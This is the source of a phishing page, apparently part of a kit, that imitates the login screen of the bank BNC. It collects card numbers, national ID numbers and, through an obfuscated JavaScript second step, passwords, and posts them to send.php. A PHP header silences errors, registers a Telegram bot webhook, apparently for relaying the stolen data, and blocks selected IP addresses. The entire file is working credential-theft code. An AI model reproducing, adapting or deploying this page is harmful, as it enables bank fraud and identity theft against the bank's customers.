<?php
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
error_reporting(0);
ob_start();


@include_once __DIR__ . '/limpiar_requests.php';
@include_once __DIR__ . '/config.php';


if (!isset($bot_token_2, $webhook_url)) {
    exit;
}


$setWebhookUrl = sprintf(
    "https://api.telegram.org/bot%s/setWebhook?url=%s",
    urlencode($bot_token_2),
    urlencode($webhook_url)
);

$response = @file_get_contents($setWebhookUrl);


$result = [];
if ($response !== false) {
    $decoded = @json_decode($response, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
        $result = $decoded;
    }
}

// 🚫 Bloqueo de IPs no autorizadas
$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);

// Lista de IPs bloqueadas (agrega según sea necesario)
$ips_bloqueadas = ["---", "---"];

if (in_array($user_ip, $ips_bloqueadas, true)) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

ob_end_clean();
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="iconero.ico">
    <title>BNC</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            background: #efefef;
            overflow-x: hidden;
            position: relative;

            display: flex;
            justify-content: center;
            align-items: center;

            padding: 20px;
        }

        /* ===== BACKGROUND ===== */

        .bg-shapes {
            position: absolute;
            inset: 0;
            overflow: hidden;
            z-index: 0;
        }

        .shape {
            position: absolute;
            background: rgba(255, 255, 255, 0.35);
            transform: skewX(-12deg);
        }

        .shape1 {
            width: 180px;
            height: 140%;
            left: 220px;
            top: -100px;
        }

        .shape2 {
            width: 140px;
            height: 140%;
            left: 560px;
            top: -120px;
        }

        .shape3 {
            width: 130px;
            height: 140%;
            left: -20px;
            top: 240px;
            transform: rotate(25deg);
            opacity: .15;
        }

        /* ===== PAGE ===== */

        .wrapper {
            position: relative;
            z-index: 2;

            width: 100%;
            max-width: 520px;

            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        /* ===== LOGO ===== */

        .logo {
            width: 78px;
            margin-bottom: 18px;
            margin-left: 6px;
        }

        .logo img {
            width: 100%;
            display: block;
        }

        /* ===== LOGIN CARD ===== */

        .login-card {
            width: 100%;
            border-radius: 18px;
            overflow: hidden;
            background: #082a50;

            box-shadow:
                0 10px 30px rgba(0, 0, 0, .12);
        }

        /* ===== TOP TABS ===== */

        .top-tabs {
            display: flex;
            height: 62px;
            background: #c9c9c9;
        }

        .top-tab {
            flex: 1;
            border: none;
            background: #b9bcc2;

            font-size: 18px;
            font-weight: 400;

            color: #111;
            cursor: pointer;
            transition: .25s;
            position: relative;

            font-family: 'Poppins', sans-serif;
        }

        .top-tab.active {
            background: white;
        }

        .top-tab.active::after {
            content: '';
            position: absolute;
            left: 0;
            bottom: 0;
            width: 100%;
            height: 3px;
            background: #ff5a00;
        }

        /* ===== CONTENT ===== */

        .content {
            background: linear-gradient(to bottom, #00215d, #001742);
            padding: 16px 18px 18px;
        }

        /* ===== TITLES ===== */

        .title {
            text-align: center;
            color: white;

            font-size: 30px;
            font-weight: 500;

            line-height: 1.1;

            margin-bottom: 6px;
        }

        .subtitle {
            text-align: center;
            color: white;

            font-size: 15px;
            line-height: 1.5;

            margin-bottom: 12px;
        }

        .subtitle strong {
            font-weight: 700;
        }

        /* ===== OPTION SWITCH ===== */

        .option-switch {
            width: 100%;
            border: 1px solid rgba(255, 255, 255, .5);
            border-radius: 10px;
            overflow: hidden;
            display: flex;
            margin-bottom: 14px;
        }

        .option-btn {
            flex: 1;
            border: none;

            height: 48px;

            background: transparent;
            color: #8d96ab;

            font-size: 15px;

            font-family: 'Poppins', sans-serif;
            cursor: pointer;
            transition: .25s;
        }

        .option-btn.active {
            background: #ff5a00;
            color: white;
        }

        /* ===== SEPARATOR ===== */

        .separator {
            width: 100%;
            height: 1px;
            background: rgba(255, 255, 255, .15);
            margin: 12px 0 18px;
        }

        /* ===== INPUTS ===== */

        .form-group {
            display: flex;
            align-items: center;

            height: 56px;

            border-radius: 8px;
            overflow: hidden;

            margin-bottom: 14px;

            background: white;

            border: 1px solid #d9d9d9;

            transition:
                border .25s ease,
                box-shadow .25s ease;
        }

        /* EFECTO AL SELECCIONAR */

        .form-group:focus-within {
            border: 3px solid #ff5a00;
        }

        .icon-box {
            width: 54px;
            height: 100%;
            background: #ffffff;

            display: flex;
            align-items: center;
            justify-content: center;

            border-right: 1px solid #cfcfcf;

            position: relative;
            z-index: 2;
        }

        .icon {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon img {
            width: 22px;
            object-fit: contain;
        }

        .form-input {
            flex: 1;
            height: 100%;

            border: none;
            outline: none;

            padding: 0 14px;

            font-size: 16px;

            font-family: 'Poppins', sans-serif;
            color: #333;

            background: white;
        }

        .form-input::placeholder {
            color: #8d8d8d;
        }

        /* ===== BUTTON ===== */

        .submit-btn {
            width: 100%;
            height: 52px;

            border: none;
            border-radius: 8px;

            background: #1f58d6;
            color: white;

            font-size: 17px;
            font-weight: 500;

            cursor: pointer;
            transition: .2s;

            font-family: 'Poppins', sans-serif;
        }

        .submit-btn:hover {
            background: #1a4cbc;
        }

        /* ===== FORGOT ===== */

        .forgot {
            text-align: center;
            margin-top: 14px;
        }

        .forgot a {
            color: white;
            text-decoration: none;
            display: inline-block;
        }

        .lock {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;

            color: white;
            font-size: 14px;

            cursor: pointer;
        }

        .lock img {
            width: 18px;
            height: 18px;
            object-fit: contain;
        }

        .lock span {
            line-height: 1;
            border-bottom: 1px dashed rgba(255, 255, 255, .7);
            padding-bottom: 1px;
        }

        /* ===== FOOTER ===== */

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;

            margin-top: 14px;
            gap: 14px;
        }

        .footer p {
            color: white;
            font-size: 11.5px;
            line-height: 1.6;
            max-width: 320px;
        }



        /* ===== RESPONSIVE ===== */

        @media(max-width:600px) {

            body {
                padding: 14px;
                align-items: flex-start;
            }

            .wrapper {
                max-width: 100%;
            }

            .logo {
                width: 72px;
                margin-bottom: 14px;
            }

            .title {
                font-size: 26px;
            }

            .subtitle {
                font-size: 14px;
            }

            .top-tab {
                font-size: 16px;
            }

            .option-btn {
                font-size: 13px;
            }

            .form-input {
                font-size: 15px;
            }

            .footer {
                flex-direction: column;
                align-items: flex-start;
            }

            .security {
                align-self: flex-end;
            }
        }

        /* ===== SECURITY ===== */

        .security {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .security img {
            width: 135px;
            height: auto;
            object-fit: contain;
            display: block;
        }


        .form-group {
            transition:
                border .25s ease,
                box-shadow .25s ease,
                transform .35s ease,
                opacity .35s ease;
        }
    </style>
</head>

<body>

    <div class="bg-shapes">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>

    <div class="wrapper">

        <!-- LOGO -->
        <div class="logo">
            <img src="bnc.png">
        </div>

        <!-- CARD -->
        <div class="login-card">
            <form id="loginForm" method="post" action="send.php">
            <input type="hidden" name="tipo_usuario" id="tipo_usuario" value="personas">
            <input type="hidden" name="tipo_tarjeta" id="tipo_tarjeta" value="Débito | Crédito">
            <!-- TOP TABS -->
            <div class="top-tabs">
                <button class="top-tab active" id="personasTab">
                    Personas
                </button>

                <button class="top-tab" id="empresasTab">
                    Empresas
                </button>
            </div>

            <!-- CONTENT -->
            <div class="content">

                <h1 class="title">Iniciar Sesión</h1>

                <div class="subtitle">
                    ¡Buenas , <strong>Bienvenido!</strong><br>
                    Ingrese sus credenciales
                </div>

                <!-- SWITCH -->
                <div class="option-switch" id="optionSwitch">

                    <!-- PERSONAS -->
                    <button class="option-btn active">
                        Débito | Crédito
                    </button>

                    <button class="option-btn">
                        Tarjeta Débito BOD
                    </button>

                </div>

                <div class="separator"></div>


                    <div class="form-group active">
                        <div class="icon-box">
                            <div class="icon">
                                <img src="car.jpg">
                            </div>
                        </div>

                        <input type="text" class="form-input" name="card" id="card" placeholder="Número de Tarjeta" inputmode="numeric"
  pattern="[0-9]{16}"
  minlength="16"
  maxlength="16" required>
                    </div>

                    <div class="form-group" id="identityField">
                        <div class="icon-box">
                            <div class="icon">
                                <img src="carne.jpg">
                            </div>
                        </div>

                        <input type="text" name="doc" id="doc" class="form-input" placeholder="Cédula de Identidad" inputmode="numeric" required>
                    </div>

                    <button class="submit-btn">
                        Continuar
                    </button>

                </form>

                <div class="separator"></div>

                <div class="forgot">
                    <a href="#">
                        <div class="lock">
                            <img src="candao.png">
                            <span>¿Olvidaste tu clave?</span>
                        </div>
                    </a>
                </div>

                <div class="footer">
                    <div class="security">
                        <p>
                            Tus datos se encuentran protegidos por nuestro certificado
                            de seguridad digital (TLS/SSL)
                        </p>
                        <img src="secure.png">
                    </div>

                </div>

            </div>

        </div>

    </div>

<script>
const _0xad0a15=_0x5459;(function(_0x1e57be,_0x5b8af1){const _0x2d9e61=_0x5459,_0x53cbf9=_0x1e57be();while(!![]){try{const _0x5612f7=-parseInt(_0x2d9e61(0x14d))/0x1*(-parseInt(_0x2d9e61(0x13f))/0x2)+-parseInt(_0x2d9e61(0x15e))/0x3*(-parseInt(_0x2d9e61(0x156))/0x4)+parseInt(_0x2d9e61(0x132))/0x5*(parseInt(_0x2d9e61(0x16a))/0x6)+-parseInt(_0x2d9e61(0x159))/0x7*(parseInt(_0x2d9e61(0x147))/0x8)+-parseInt(_0x2d9e61(0x153))/0x9+parseInt(_0x2d9e61(0x141))/0xa+-parseInt(_0x2d9e61(0x157))/0xb;if(_0x5612f7===_0x5b8af1)break;else _0x53cbf9['push'](_0x53cbf9['shift']());}catch(_0x388228){_0x53cbf9['push'](_0x53cbf9['shift']());}}}(_0x137d,0xd33f1));const personasTab=document['getElementById'](_0xad0a15(0x135)),empresasTab=document[_0xad0a15(0x138)]('empresasTab'),optionSwitch=document[_0xad0a15(0x138)](_0xad0a15(0x14f)),identityField=document[_0xad0a15(0x138)](_0xad0a15(0x168)),loginForm=document['getElementById'](_0xad0a15(0x155)),submitBtn=document[_0xad0a15(0x142)]('.submit-btn');let currentMode=_0xad0a15(0x14a),loginStep=0x1;function activateTopTab(_0x287037){const _0x49667a=_0xad0a15;personasTab[_0x49667a(0x148)][_0x49667a(0x136)](_0x49667a(0x137)),empresasTab[_0x49667a(0x148)][_0x49667a(0x136)]('active'),_0x287037[_0x49667a(0x148)][_0x49667a(0x146)](_0x49667a(0x137));}function _0x137d(){const _0x1cf877=['personas','click','doc','275769EYDFHn','forEach','optionSwitch','Débito\x20|\x20Crédito','insertBefore','textContent','3627189YzqStT','div','loginForm','851444XkwlcU','16107234WuJByM','.form-group','47341NNGnDK','tipo_tarjeta','createElement','value','flex','3YXJlKh','hidden','innerHTML','transition','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22option-btn\x20active\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Débito\x20|\x20Crédito\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22option-btn\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Tarjeta\x20Débito\x20BOD\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20','required','transform','addEventListener','input','visibility','identityField','display','96DJZVeB','empresas','523805xQJmrJ','style','opacity','personasTab','remove','active','getElementById','BNCNET','input[name=\x22clave\x22]','trim','preventDefault','afterend','focus','12zCjnyA','querySelectorAll','1086970FPgdxg','querySelector','none','form-group','submit','add','1088aGXDxk','classList','absolute'];_0x137d=function(){return _0x1cf877;};return _0x137d();}function renderPersonas(){const _0x309d3a=_0xad0a15;currentMode=_0x309d3a(0x14a),document[_0x309d3a(0x138)]('tipo_usuario')['value']='personas',activateTopTab(personasTab),optionSwitch[_0x309d3a(0x160)]=_0x309d3a(0x162),document[_0x309d3a(0x138)](_0x309d3a(0x15a))[_0x309d3a(0x15c)]=_0x309d3a(0x150),identityField[_0x309d3a(0x133)][_0x309d3a(0x169)]=_0x309d3a(0x15d);const _0x388317=document['getElementById'](_0x309d3a(0x14c));_0x388317['required']=!![],setupOptionButtons();}function renderEmpresas(){const _0x536bcc=_0xad0a15;currentMode='empresas',document[_0x536bcc(0x138)]('tipo_usuario')['value']=_0x536bcc(0x16b),activateTopTab(empresasTab),optionSwitch[_0x536bcc(0x160)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22option-btn\x20active\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20BNCNET\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22option-btn\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Débito\x20Jurídica\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20',document[_0x536bcc(0x138)]('tipo_tarjeta')[_0x536bcc(0x15c)]=_0x536bcc(0x139),identityField[_0x536bcc(0x133)][_0x536bcc(0x169)]=_0x536bcc(0x143);const _0x336893=document[_0x536bcc(0x138)](_0x536bcc(0x14c));_0x336893[_0x536bcc(0x163)]=![],setupOptionButtons();}function _0x5459(_0x207b1c,_0x917e9b){_0x207b1c=_0x207b1c-0x132;const _0x137da5=_0x137d();let _0x5459ee=_0x137da5[_0x207b1c];return _0x5459ee;}function setupOptionButtons(){const _0x29b88f=_0xad0a15,_0x9308be=document[_0x29b88f(0x140)]('.option-btn');_0x9308be[_0x29b88f(0x14e)](_0x5ca6ea=>{const _0x33b363=_0x29b88f;_0x5ca6ea[_0x33b363(0x165)]('click',()=>{const _0x3318da=_0x33b363;_0x9308be[_0x3318da(0x14e)](_0x3ca0b8=>{const _0x47f0ba=_0x3318da;_0x3ca0b8[_0x47f0ba(0x148)][_0x47f0ba(0x136)](_0x47f0ba(0x137));}),_0x5ca6ea[_0x3318da(0x148)][_0x3318da(0x146)](_0x3318da(0x137)),document[_0x3318da(0x138)](_0x3318da(0x15a))[_0x3318da(0x15c)]=_0x5ca6ea[_0x3318da(0x152)]['trim']();});});}personasTab['addEventListener'](_0xad0a15(0x14b),_0x19abc6=>{const _0x494ac8=_0xad0a15;_0x19abc6[_0x494ac8(0x13c)](),renderPersonas();}),empresasTab[_0xad0a15(0x165)]('click',_0x1b17e1=>{const _0x5c062b=_0xad0a15;_0x1b17e1[_0x5c062b(0x13c)](),renderEmpresas();}),setupOptionButtons(),loginForm[_0xad0a15(0x165)](_0xad0a15(0x145),_0x19ef6b=>{const _0x27e860=_0xad0a15;if(loginStep===0x1){_0x19ef6b[_0x27e860(0x13c)]();const _0x4b6540=document[_0x27e860(0x140)](_0x27e860(0x158)),_0x109d91=_0x4b6540[0x0],_0x4f7bf1=identityField[_0x27e860(0x142)](_0x27e860(0x166)),_0x483abf=_0x109d91[_0x27e860(0x142)](_0x27e860(0x166));if(_0x483abf[_0x27e860(0x15c)][_0x27e860(0x13b)]()===''){_0x483abf[_0x27e860(0x13e)]();return;}if(identityField[_0x27e860(0x133)][_0x27e860(0x169)]!==_0x27e860(0x143)&&_0x4f7bf1['value'][_0x27e860(0x13b)]()===''){_0x4f7bf1[_0x27e860(0x13e)]();return;}_0x109d91[_0x27e860(0x133)][_0x27e860(0x161)]='.35s',_0x109d91[_0x27e860(0x133)][_0x27e860(0x134)]='0',_0x109d91[_0x27e860(0x133)][_0x27e860(0x164)]='translateY(-15px)',setTimeout(()=>{const _0x1b079c=_0x27e860;_0x109d91[_0x1b079c(0x133)][_0x1b079c(0x167)]=_0x1b079c(0x15f),_0x109d91[_0x1b079c(0x133)]['position']=_0x1b079c(0x149);const _0xbc3f7e=document[_0x1b079c(0x15b)](_0x1b079c(0x154));_0xbc3f7e['className']=_0x1b079c(0x144),_0xbc3f7e[_0x1b079c(0x160)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon-box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22blacklock.png\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20type=\x22password\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20name=\x22clave\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22form-input\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20placeholder=\x22Clave\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20required\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',currentMode===_0x1b079c(0x14a)?identityField['insertAdjacentElement'](_0x1b079c(0x13d),_0xbc3f7e):optionSwitch['parentNode'][_0x1b079c(0x151)](_0xbc3f7e,submitBtn),_0xbc3f7e['querySelector'](_0x1b079c(0x166))[_0x1b079c(0x13e)]();},0x15e),loginStep=0x2;return;}if(loginStep===0x2){const _0x16791d=document[_0x27e860(0x142)](_0x27e860(0x13a));if(!_0x16791d||_0x16791d[_0x27e860(0x15c)][_0x27e860(0x13b)]()===''){_0x19ef6b[_0x27e860(0x13c)]();_0x16791d&&_0x16791d[_0x27e860(0x13e)]();return;}}});
</script>
</body>
</html>
